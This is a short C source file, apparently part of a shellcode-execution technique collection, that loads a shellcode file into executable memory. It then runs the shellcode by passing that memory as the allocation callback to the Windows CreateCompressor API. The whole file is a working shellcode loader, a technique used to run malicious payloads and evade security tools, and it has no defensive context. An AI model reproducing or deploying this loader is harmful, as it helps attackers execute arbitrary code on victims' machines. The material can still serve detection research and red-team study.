// Wra7h/FlavorTown
// Minimum Supported Client: Windows 8
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Cabinet.lib")

#include <stdio.h>
#include <windows.h>
#include <compressapi.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	COMPRESS_ALLOCATION_ROUTINES SCAR = { 0 };
	COMPRESSOR_HANDLE hCompressor = NULL;
	
	if (argc != 2)
	{
		printf("Usage: CreateCompressor.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	SCAR.Allocate = hAlloc;
	SCAR.Free = hAlloc;
	SCAR.UserContext = NULL;

	CreateCompressor(COMPRESS_ALGORITHM_MSZIP, &SCAR, &hCompressor);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hCompressor)
		CloseCompressor(hCompressor);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}